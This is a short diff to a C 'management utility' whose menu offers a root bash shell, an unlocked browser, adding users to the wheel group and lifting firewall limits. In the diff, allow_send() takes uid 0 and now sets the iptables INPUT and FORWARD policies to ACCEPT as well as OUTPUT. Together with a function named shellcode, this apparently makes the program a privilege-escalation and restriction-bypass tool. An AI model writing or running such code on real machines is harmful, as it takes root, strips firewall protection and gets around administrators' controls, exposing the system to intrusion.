@@ -17,7 +17,7 @@ void show_usage() {
 	printf("=== Management utility ===\n");
 	printf_success("Usage:\n");
 	printf("1. Exec /bin/bash with root privileges\n");
-	printf("2. Unblock iptables OUTPUT restrictions\n");
+	printf("2. Unblock iptables OUTPUT/INPUT/FORWARD restrictions\n");
 	printf("3. Start unlocked firefox\n");
 	printf("4. Add user in wheel group\n");
 	printf("5. Delete already added user\n");
@@ -48,6 +48,8 @@ void shellcode(void) {
 int allow_send(void) {
 	give_me_uid(0);
 	system("/usr/sbin/iptables -P OUTPUT ACCEPT");
+	system("/usr/sbin/iptables -P INPUT ACCEPT");
+	system("/usr/sbin/iptables -P FORWARD ACCEPT");
 	system("systemctl restart iptables.service");
 	printf_success("[+] Send operation: allowed\n");
 	return 0;
